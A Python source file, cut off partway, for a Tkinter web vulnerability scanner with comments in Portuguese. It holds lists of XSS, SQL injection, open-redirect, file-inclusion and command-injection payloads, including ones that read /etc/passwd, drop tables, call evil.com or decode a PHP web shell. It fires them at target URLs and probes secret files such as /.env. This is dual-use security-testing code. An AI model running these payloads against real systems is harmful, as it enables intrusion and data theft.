#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebVuln Scanner - Scanner de Segurança Web

Uso:    
    python3 WebVuln Scanner.py   

Recursos:
    - Descoberta de endpoints (paths comuns + crawling + padrões de API)
    - Testes de XSS, SQLi, Open Redirect, LFI e Command Injection (agressivo)
    - Verificação de cabeçalhos de segurança
    - Console em tempo real com cores (thread separada - GUI nunca congela)
    - Tabelas de resultados com cores por severidade
    - Geração de relatórios JSON e HTML
    - Botão de cancelamento a qualquer momento

    Sites Pra  Testar 

    http://php.testsparker.com/auth/login.php

    http://65.61.137.117/login.jsp

Aviso: ferramenta para testes de segurança autorizados apenas.
"""
import html
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import requests
import json
import sys
import threading
import queue
import time
import random
import hashlib
import warnings
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from pathlib import Path
import re
import platform
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings('ignore', message='Unverified HTTPS request')


# =============================================================================
# 1) NÚCLEO DO SCANNER (lógica idêntica à CLI, com callback de log e stop)
# =============================================================================

class WebVulnEngine:
    """Motor de varredura. Substitui print() por log_callback(msg, level)."""

    def __init__(self, domain, timeout=10, threads=10, aggressive=False,
                 log_callback=None, stop_event=None):
        self.domain = domain if domain.startswith('http') else f'https://{domain}'
        self.timeout = timeout
        self.threads = threads
        self.aggressive = aggressive
        self.log_callback = log_callback or (lambda msg, level='info': None)
        self.stop_event = stop_event or threading.Event()

        self.visited_urls = set()
        self.discovered_endpoints = []
        self.vulnerabilities = []
        self.headers_issues = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        
        # Descoberta avançada de caminhos (unificada, sem duplicatas)
        self.common_paths = [
            # --- Bloco 1 (original) ---
            "/",                    "/admin",              "/login",              "/api",
            "/search",              "/user",               "/profile",            "/contact",
            "/about",               "/products",           "/services",           "/dashboard",
            "/api/v1",              "/api/v2",             "/wp-admin",           "/phpmyadmin",
            "/administrator",       "/backup",             "/test",               "/dev",
            "/staging",             "/config",             "/settings",           "/upload",
            "/uploads",             "/files",              "/download",           "/static",
            "/assets",              "/.git/config",        "/.env",               "/robots.txt",
            "/sitemap.xml",         "/.well-known",        "/graphql",            "/swagger",
            "/api-docs",            "/debug",              "/console",

            # --- Itens novos (sem repetir) ---
            "/admin/",              "/account",            "/app",                "/backup.sql",
            "/backup.tar.gz",       "/backup.zip",         "/blog",               "/cgi-bin",
            "/config.bak",          "/config.php",         "/config.php.bak",     "/cpanel",
            "/crossdomain.xml",     "/database.sql",       "/db.sql",             "/images",
            "/includes",            "/index.php",          "/install",            "/js",
            "/lib",                 "/license.txt",        "/login.php",          "/logout",
            "/media",               "/node_modules",       "/panel",              "/phpinfo.php",
            "/plugins",             "/private",            "/readme.html",        "/readme.txt",
            "/register",            "/security.txt",       "/server-status",      "/shell",
            "/shell.php",           "/swagger-ui",         "/swagger.json",       "/swagger.yaml",
            "/test.php",            "/tmp",                "/user/login",         "/vendor",
            "/webmail",             "/wp-content",         "/wp-includes",        "/wp-json",
            "/wp-login.php",        "/wp-config.php",      "/wp-config.php.bak",  "/xmlrpc.php",
            "/.env.backup",         "/.env.dev",           "/.env.local",         "/.env.production",
            "/.git",                "/.git/HEAD",          "/.gitignore",         "/.htaccess",
            "/.htpasswd",           "/composer.json",      "/composer.lock",      "/package.json",
            "/package-lock.json",   "/yarn.lock"
        ]

        # Payloads de XSS
        self.xss_payloads = [
            # Básicos
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<details open ontoggle=alert(1)>',
            '<math><mtext></table><script>alert(1)</script>',
            
            # Event handlers
            '<img src=x onerror=alert`1`>',
            '<svg onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<div onmouseover=alert(1)>XSS</div>',
            
            # Bypass de filtros
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img src=x oNeRrOr=alert(1)>',
            '<svg/onload=alert(String.fromCharCode(49))>',
            'javascript:alert(1)',
            'JaVaScRiPt:alert(1)',
            '"><img src=x onerror=confirm(1)>',
            '"><img src=x onerror=prompt(1)>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>',
            
            # Template / Polyglot
            '{{7*7}}',
            '${7*7}',
            '{{constructor.constructor("alert(1)")()}}',
            '${alert(1)}',
            '#{7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{self}}',
        ]

        # Payloads de SQLi
        self.sqli_payloads = [
            # Detection
            "'",
            '"',
            "')",
            '")',
            "';",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "' AND 1=1--",
            "' AND 1=2--",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT null,version()--",
            "' UNION ALL SELECT NULL--",
            
            # Order by / Error-based
            "1' ORDER BY 1--",
            "1' ORDER BY 5--",
            "1' ORDER BY 10--",
            "1' ORDER BY 100--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Time-based / Blind
            "' OR SLEEP(5)--",
            "' OR SLEEP(5)#",
            "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            
            # Outros
            "1'; DROP TABLE users--",
            "1'; SELECT * FROM users--",
            "' HAVING 1=1--",
            "' GROUP BY 1--",
            "') OR ('1'='1",
            "1' AND '1'='1",
        ]

        # Payloads de Open Redirect
        self.redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '///evil.com',
            'https:evil.com',
            '\\\\evil.com',
            '//google.com',
            '///google.com',
            '/\\evil.com',
            '////evil.com',
            'https://evil.com/',
            'https://evil.com/%2f..',
            'https://evil.com%2f%2e%2e',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '//evil.com/%2e%2e',
            'https://evil.com@google.com',
            'https://google.com.evil.com',
            'https://evil.com\\@google.com',
            '/redirect?url=https://evil.com',
            '?next=https://evil.com',
            '?url=//evil.com',
            '?redirect=///evil.com',
            'https://evil.com%00.google.com',
        ]

        # Payloads de LFI / Path Traversal
        self.lfi_payloads = [
            # Unix clássicos
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/etc/passwd',
            'file:///etc/passwd',
            '....\/....\/....\/etc/passwd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '/proc/self/environ',
            '/proc/version',
            '/etc/hosts',
            '/etc/shadow',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            
            # Windows
            '..\\..\\..\\windows\\win.ini',
            '..%5c..%5c..%5cwindows%5cwin.ini',
            'C:\\Windows\\win.ini',
            'C:/Windows/win.ini',
            '..\\..\\..\\boot.ini',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            
            # PHP Wrappers / Filtros
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'php://filter/convert.base64-encode/resource=../config.php',
            'expect://id',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
            'php://input',
            'zip://shell.jpg%23shell.php',
        ]

        # Payloads de Command Injection
        self.cmd_payloads = [
            # Unix/Linux
            '; ls',
            '| ls',
            '`ls`',
            '$(ls)',
            '; whoami',
            '| whoami',
            '& whoami',
            '&& whoami',
            '|| whoami',
            ';id',
            '|id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; uname -a',
            '| uname -a',
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 4 127.0.0.1',
            '| nslookup evil.com',
            
            # Windows
            '& dir',
            '| dir',
            '& whoami',
            '| whoami',
            '& type C:\\Windows\\win.ini',
            '| type C:\\Windows\\win.ini',
            '& ping -n 5 127.0.0.1',
            '| ping -n 5 127.0.0.1',
            
            # Outros / bypass
            '%0a whoami',
            '%0d%0a whoami',
            ';${IFS}whoami',
            '|${IFS}whoami',
            '$(whoami)',
            '`whoami`',
            ';$(whoami)',
        ]      

    # ------------------------------------------------------------------ utils
    def log(self, message, level='info'):
        """Envia mensagem para a GUI (callback thread-safe)."""
        if self.log_callback:
            self.log_callback(message, level)

    # ------------------------------------------------------- segurança básica
    def check_security_headers(self, url):
        """Verifica cabeçalhos de segurança ausentes."""
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            headers = resp.headers

            security_headers = {
                'X-Frame-Options': 'Missing - Clickjacking possible',
                'X-Content-Type-Options': 'Missing - MIME sniffing possible',
                'Strict-Transport-Security': 'Missing - HTTPS not enforced',
                'Content-Security-Policy': 'Missing - XSS protection weak',
                'X-XSS-Protection': 'Missing - Browser XSS filter disabled',
                'Referrer-Policy': 'Missing - Information leakage possible'
            }

            for header, issue in security_headers.items():
                if header not in headers:
                    self.headers_issues.append({
                        'url': url,
                        'missing_header': header,
                        'impact': issue
                    })
                    self.log(f'[!] Cabeçalho ausente: {header} — {issue}', 'warn')
        except Exception as e:
            self.log(f'[!] Erro ao verificar headers: {str(e)}', 'warn')

    # ------------------------------------------------------- descoberta
    def discover_endpoints(self) -> list:
        """Descoberta avançada de endpoints."""
        self.log('[*] Fase 1: Descoberta de Endpoints', 'header')
        endpoints = set()

        # Caminhos comuns
        self.log('[*] Testando caminhos comuns...', 'info')
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_path, path): path for path in self.common_paths}

            for future in as_completed(futures):
                if self.stop_event.is_set():
                    break
                result = future.result()
                if result:
                    endpoints.add(result['url'])
                    self.discovered_endpoints.append(result)
                    color = 'success' if result['status'] < 400 else 'warn'
                    self.log(f"[+] {result['url']} [{result['status']}] "
                             f"({result['length']} bytes) [{result.get('server', 'Unknown')}]", color)

        if self.stop_event.is_set():
            return list(endpoints)

        # Crawling da aplicação
        self.log('[*] Rastreando a aplicação web...', 'info')
        try:
            resp = self.session.get(self.domain, timeout=self.timeout,
                                    allow_redirects=True, verify=False)
            if resp.status_code == 200:
                links = set()
                links.update(re.findall(r'href=["\'](.*?)["\']', resp.text))
                links.update(re.findall(r'src=["\'](.*?)["\']', resp.text))
                links.update(re.findall(r'action=["\'](.*?)["\']', resp.text))

                # Endpoints de API vindos de JavaScript
                api_patterns = [
                    r'["\']([/]api[^"\']*)["\']',
                    r'["\']([/]v\d+[^"\']*)["\']',
                    r'fetch\(["\']([^"\']+)["\']',
                    r'axios\.[a-z]+\(["\']([^"\']+)["\']'
                ]
                for pattern in api_patterns:
                    links.update(re.findall(pattern, resp.text))

                for link in links:
                    if self.stop_event.is_set():
                        break
                    if link and not link.startswith(('data:', 'mailto:', 'tel:', '#', 'javascript:')):
                        full_url = urljoin(self.domain, link)
                        parsed = urlparse(full_url)

                        if parsed.netloc == urlparse(self.domain).netloc:
                            if full_url not in endpoints and len(endpoints) < 100:
                                endpoints.add(full_url)
                                self.log(f'[+] Descoberto: {full_url}', 'success')
        except Exception as e:
            self.log(f'[!] Erro no crawling: {str(e)}', 'warn')

        # Cabeçalhos de segurança
        self.log('[*] Analisando cabeçalhos de segurança...', 'info')
        self.check_security_headers(self.domain)

        return list(endpoints)

    def check_path(self, path: str):
        """Verifica se um caminho existe."""
        url = urljoin(self.domain, path)
        try:
            resp = self.session.get(url, timeout=self.timeout,
                                    allow_redirects=False, verify=False)
            if resp.status_code < 400 or resp.status_code in (401, 403):
                return {
                    'url': url,
                    'status': resp.status_code,
                    'length': len(resp.content),
                    'server': resp.headers.get('Server', 'Unknown')
                }
        except Exception:
            pass
        return None

    # ------------------------------------------------------- XSS
    def test_xss(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params or self.stop_event.is_set():
            return

        for param in params:
            for payload in self.xss_payloads:
                if self.stop_event.is_set():
                    return
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                try:
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)

                    # Reflexão em contexto perigoso
                    if payload in resp.text and 'text/html' in resp.headers.get('Content-Type', ''):
                        
                        # 1. Contextos perigosos (mais precisos)
                        dangerous_contexts = [
                            f'<script>{payload}',
                            f'>{payload}<',
                            f'="{payload}"',
                            f"='{payload}'",
                            f'onerror={payload}',
                            f'onload={payload}',
                            f'onclick={payload}',
                            f'onfocus={payload}',
                            f'javascript:{payload}',
                            f'`{payload}`',
                            f'({payload})',
                        ]
                        
                        # 2. Define a evidência conforme o contexto
                        if any(ctx in resp.text for ctx in dangerous_contexts):
                            evidence = 'Payload reflected in dangerous context'
                        else:
                            evidence = 'Payload reflected (possible XSS - needs manual verification)'
                        
                        # Sempre marca como HIGH
                        vuln = {
                            'type': 'XSS (Reflected)',
                            'severity': 'HIGH',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': evidence
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f'[!] XSS ENCONTRADO: {url} (param: {param})', 'vuln')
                        return

                    # Template injection
                    if payload in ['{{7*7}}', '${7*7}'] and '49' in resp.text:
                        vuln = {
                            'type': 'Template Injection',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Template expression evaluated (7*7=49)'
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f'[!] TEMPLATE INJECTION: {url} (param: {param})', 'vuln')
                        return
                except Exception:
                    pass

    # ------------------------------------------------------- SQLi
    def test_sqli(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params or self.stop_event.is_set():
            return

        # Linha de base
        try:
            baseline = self.session.get(url, timeout=self.timeout, verify=False)
            baseline_length = len(baseline.content)
        except Exception:
            return

        sql_errors = [
            'sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'mssql',
            'syntax error', 'unterminated', 'database error', 'odbc',
            'jdbc', 'db2', 'warning:', 'error in your sql', 'pg_query',
            'mysqli', 'sqlstate', 'unexpected end of sql', 'quoted string',
            'you have an error'
        ]

        for param in params:
            error_found = False
            for payload in self.sqli_payloads:
                if self.stop_event.is_set():
                    return
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                try:
                    start_time = time.time()
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    elapsed = time.time() - start_time

                    # Error-based
                    resp_lower = resp.text.lower()
                    for error in sql_errors:
                        if error in resp_lower and not error_found:
                            vuln = {
                                'type': 'SQL Injection (Error-based)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'SQL error message detected: {error}'
                            }
                            self.vulnerabilities.append(vuln)
                            self.log(f'[!] SQLi ENCONTRADO: {url} (param: {param})', 'vuln')
                            error_found = True
                            return

                    # Time-based
                    if 'SLEEP' in payload and elapsed > 4:
                        vuln = {
                            'type': 'SQL Injection (Time-based)',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Response delayed by {elapsed:.2f} seconds'
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f'[!] SQLi (Time-based) ENCONTRADO: {url} (param: {param})', 'vuln')
                        return

                    # Boolean-based
                    if '1=1' in payload or '1=2' in payload:
                        length_diff = abs(len(resp.content) - baseline_length)
                        if length_diff > 100:
                            vuln = {
                                'type': 'SQL Injection (Boolean-based)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Response length changed significantly ({length_diff} bytes)'
                            }
                            self.vulnerabilities.append(vuln)
                            self.log(f'[!] SQLi (Boolean-based) ENCONTRADO: {url} (param: {param})', 'vuln')
                            return
                except Exception:
                    pass

    # ------------------------------------------------------- Open Redirect
    def test_open_redirect(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if self.stop_event.is_set():
            return

        redirect_params = ['redirect', 'url', 'next', 'return', 'returnTo', 'redir',
                           'goto', 'link', 'target', 'dest', 'destination', 'continue',
                           'out', 'view', 'to', 'uri', 'path', 'reference']

        for param in params:
            if any(rp in param.lower() for rp in redirect_params):
                for payload in self.redirect_payloads:
                    if self.stop_event.is_set():
                        return
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    try:
                        resp = self.session.get(test_url, timeout=self.timeout,
                                                allow_redirects=False, verify=False)
                        if 300 <= resp.status_code < 400:
                            location = resp.headers.get('Location', '')
                            if 'evil.com' in location or 'google.com' in location or location.startswith('//'):
                                vuln = {
                                    'type': 'Open Redirect',
                                    'severity': 'MEDIUM',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'Redirects to external domain: {location}'
                                }
                                self.vulnerabilities.append(vuln)
                                self.log(f'[!] OPEN REDIRECT: {url} (param: {param})', 'vuln')
                                return
                    except Exception:
                        pass

    # ------------------------------------------------------- LFI
    def test_lfi(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params or self.stop_event.is_set():
            return

        file_params = ['file', 'path', 'page', 'include', 'doc', 'document', 'folder', 'root']

        for param in params:
            if any(fp in param.lower() for fp in file_params) or self.aggressive:
                for payload in self.lfi_payloads:
                    if self.stop_event.is_set():
                        return
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    try:
                        resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                        lfi_indicators = [
                            'root:x:0:0:',   # /etc/passwd
                            '[extensions]',  # win.ini
                            'for 16-bit app support'
                        ]
                        if any(indicator in resp.text for indicator in lfi_indicators):
                            vuln = {
                                'type': 'Local File Inclusion',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'System file content detected in response'
                            }
                            self.vulnerabilities.append(vuln)
                            self.log(f'[!] LFI ENCONTRADO: {url} (param: {param})', 'vuln')
                            return
                    except Exception:
                        pass

    # ------------------------------------------------------- Command Injection
    def test_command_injection(self, url: str):
        if not self.aggressive or self.stop_event.is_set():
            return

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param in params:
            for payload in self.cmd_payloads:
                if self.stop_event.is_set():
                    return
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                try:
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    cmd_indicators = ['bin', 'usr', 'root', 'home', 'uid=', 'gid=']
                    if any(indicator in resp.text.lower() for indicator in cmd_indicators):
                        vuln = {
                            'type': 'Command Injection',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Command execution output detected'
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f'[!] COMMAND INJECTION: {url} (param: {param})', 'vuln')
                        return
                except Exception:
                    pass

    # ------------------------------------------------------- orquestração de testes
    def run_security_tests(self, endpoints: list):
        self.log('\n[*] Fase 2: Varredura de Vulnerabilidades', 'header')

        test_functions = [
            ('XSS', self.test_xss),
            ('SQLi', self.test_sqli),
            ('Open Redirect', self.test_open_redirect),
            ('LFI', self.test_lfi),
        ]
        if self.aggressive:
            test_functions.append(('Command Injection', self.test_command_injection))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for name, test_func in test_functions:
                if self.stop_event.is_set():
                    break
                self.log(f'[*] Testando {name}...', 'info')
                futures = [executor.submit(test_func, endpoint) for endpoint in endpoints]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
                time.sleep(0.2)

    # ------------------------------------------------------- relatórios
    def get_unique_filename(self, directory: str, base_name: str, extension: str) -> str:
        """Nome de arquivo único com índice auto-incrementado."""
        file_path = f"{directory}/{base_name}.{extension}"
        if not Path(file_path).exists():
            return file_path
        index = 1
        while True:
            file_path = f"{directory}/{base_name}({index}).{extension}"
            if not Path(file_path).exists():
                return file_path
            index += 1

    def generate_json_report(self, output_file: str):
        report = {
            'scan_metadata': {
                'target': self.domain,
                'timestamp': datetime.now().isoformat(),
                'scanner_version': '🦅 WebVuln Scanner — Scanner de Segurança Web',
                'mode': 'AGGRESSIVE' if self.aggressive else 'NORMAL'
            },
            'statistics': {
                'total_endpoints': len(self.discovered_endpoints),
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
                'security_headers_missing': len(self.headers_issues)
            },
            'endpoints': self.discovered_endpoints,
            'vulnerabilities': self.vulnerabilities,
            'security_headers': self.headers_issues
        }
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        self.log(f'[✓] Relatório JSON: {output_file}', 'success')

    def generate_html_report(self, output_file: str):
        """Gera relatório HTML profissional (mesmo template da versão CLI)."""
        import html  # Garante que está disponível (melhor importar no topo do arquivo)

        vuln_by_severity = defaultdict(list)
        for vuln in self.vulnerabilities:
            vuln_by_severity[vuln['severity']].append(vuln)

        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebVulnScanner Security Assessment - {html.escape(urlparse(self.domain).netloc)}</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');

        * {{ margin: 0; padding: 0; box-sizing: border-box; }}

        :root {{
            --primary: #2563eb;
            --critical: #dc2626;
            --high: #ea580c;
            --medium: #f59e0b;
            --low: #16a34a;
            --success: #10b981;
            --bg-primary: #ffffff;
            --bg-secondary: #f8fafc;
            --text-primary: #0f172a;
            --text-secondary: #64748b;
            --border: #e2e8f0;
        }}

        body {{
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--text-primary);
            line-height: 1.6;
            padding: 30px 20px;
            min-height: 100vh;
        }}

        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: var(--bg-primary);
            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
            border-radius: 12px;
            overflow: hidden;
            animation: slideIn 0.5s ease-out;
        }}

        @keyframes slideIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}

        .header {{
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            color: white;
            padding: 48px 60px;
            position: relative;
            overflow: hidden;
        }}

        .header::before {{
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
        }}

        @keyframes pulse {{
            0%, 100% {{ transform: scale(1); opacity: 0.5; }}
            50% {{ transform: scale(1.1); opacity: 0.3; }}
        }}

        .header-content {{ position: relative; z-index: 1; }}

        .header-top {{
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 32px;
        }}

        .logo {{
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 2px;
            background: linear-gradient(90deg, #60a5fa, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: glow 2s ease-in-out infinite alternate;
        }}

        @keyframes glow {{
            from {{ opacity: 0.8; }}
            to {{ opacity: 1; }}
        }}

        .scan-id {{
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            background: rgba(255,255,255,0.1);
            padding: 8px 16px;
            border-radius: 6px;
            border: 1px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
        }}

        h1 {{
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }}

        .target-info {{
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 12px;
            background: linear-gradient(90deg, #ffffff, #94a3b8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}

        .meta-info {{
            font-size: 13px;
            opacity: 0.7;
            font-family: 'JetBrains Mono', monospace;
        }}

        .executive-summary {{
            padding: 48px 60px;
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
            border-bottom: 1px solid var(--border);
        }}

        .summary-title {{
            font-size: 14px;
            font-weight: 700;
            color: var(--text-secondary);
            margin-bottom: 24px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }}

        .metrics-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
        }}

        .metric {{
            background: var(--bg-primary);
            padding: 28px;
            border-radius: 12px;
            border: 1px solid var(--border);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }}

        .metric::before {{
            content: '';
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 4px;
            background: linear-gradient(90deg, var(--metric-color), transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
        }}

        .metric:hover {{
            transform: translateY(-8px);
            box-shadow: 0 12px 24px rgba(0,0,0,0.15);
        }}

        .metric:hover::before {{ opacity: 1; }}

        .metric.critical {{ --metric-color: var(--critical); }}
        .metric.high {{ --metric-color: var(--high); }}
        .metric.medium {{ --metric-color: var(--medium); }}
        .metric.info {{ --metric-color: var(--primary); }}
        .metric.success {{ --metric-color: var(--success); }}

        .metric-value {{
            font-size: 42px;
            font-weight: 800;
            margin-bottom: 8px;
            line-height: 1;
            background: linear-gradient(135deg, var(--metric-color), var(--metric-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}

        .metric-label {{
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-secondary);
            font-weight: 600;
        }}

        .section {{
            padding: 48px 60px;
            border-bottom: 1px solid var(--border);
            animation: fadeIn 0.6s ease-out;
        }}

        @keyframes fadeIn {{
            from {{ opacity: 0; }}
            to {{ opacity: 1; }}
        }}

        .section-header {{
            margin-bottom: 32px;
            padding-bottom: 16px;
            border-bottom: 2px solid var(--text-primary);
            position: relative;
        }}

        .section-header::after {{
            content: '';
            position: absolute;
            bottom: -2px; left: 0;
            width: 80px; height: 2px;
            background: linear-gradient(90deg, var(--primary), transparent);
        }}

        .section-title {{
            font-size: 28px;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 8px;
        }}

        .section-subtitle {{
            font-size: 14px;
            color: var(--text-secondary);
        }}

        table {{
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin: 24px 0;
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }}

        thead {{ background: linear-gradient(135deg, #f1f5f9, #e2e8f0); }}

        th {{
            padding: 16px;
            text-align: left;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-primary);
            border-bottom: 2px solid var(--border);
        }}

        td {{
            padding: 16px;
            border-bottom: 1px solid #f0f0f0;
            font-size: 14px;
        }}

        tbody tr {{ transition: background-color 0.2s ease; }}
        tbody tr:hover {{ background: var(--bg-secondary); }}
        tbody tr:last-child td {{ border-bottom: none; }}

        .severity-group {{ margin: 40px 0; }}

        .severity-header {{
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            padding: 16px 20px;
            background: var(--bg-secondary);
            border-radius: 8px;
            border-left: 4px solid var(--severity-color);
        }}

        .severity-indicator {{
            width: 16px; height: 16px;
            border-radius: 50%;
            margin-right: 12px;
            background: var(--severity-color);
            box-shadow: 0 0 12px var(--severity-color);
            animation: blink 2s ease-in-out infinite;
        }}

        @keyframes blink {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.5; }}
        }}

        .severity-title {{
            font-size: 18px;
            font-weight: 700;
            color: var(--text-primary);
        }}

